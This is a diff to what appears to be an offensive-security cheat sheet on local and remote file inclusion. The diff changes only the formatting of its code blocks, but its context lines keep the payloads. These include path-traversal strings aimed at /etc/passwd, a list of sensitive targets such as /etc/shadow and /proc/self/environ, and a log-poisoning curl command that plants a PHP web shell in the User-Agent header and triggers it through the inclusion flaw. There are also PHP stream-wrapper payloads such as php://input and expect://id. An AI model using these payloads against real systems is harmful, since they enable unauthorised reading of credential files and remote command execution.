@@ -5,7 +5,7 @@ title: "LFI / RFI"
 
 Start with direct paths, then add traversal sequences if the app strips or validates the prefix.
 
-```
+``` wrap
 /etc/passwd
 ../../../../etc/passwd
 ....//....//etc/passwd
@@ -16,7 +16,7 @@ Start with direct paths, then add traversal sequences if the app strips or valid
 
 These paths are high-value targets once LFI is confirmed: `/etc/shadow` needs root, but logs and history files often don't.
 
-```
+``` wrap
 /etc/passwd
 /etc/shadow
 /proc/self/environ
@@ -30,7 +30,7 @@ These paths are high-value targets once LFI is confirmed: `/etc/shadow` needs ro
 
 Inject PHP into a log file via a poisoned User-Agent or parameter, then include the log via LFI to get code execution.
 
-```bash
+```bash wrap
 curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
 # Trigger: http://<IP>/page?file=/var/log/apache2/access.log&cmd=id
 ```
@@ -39,7 +39,7 @@ curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
 
 PHP stream wrappers let you read source code, inject input, or execute commands without needing a poisoned file.
 
-```
+``` wrap
 php://filter/convert.base64-encode/resource=index.php
 php://input
 expect://id
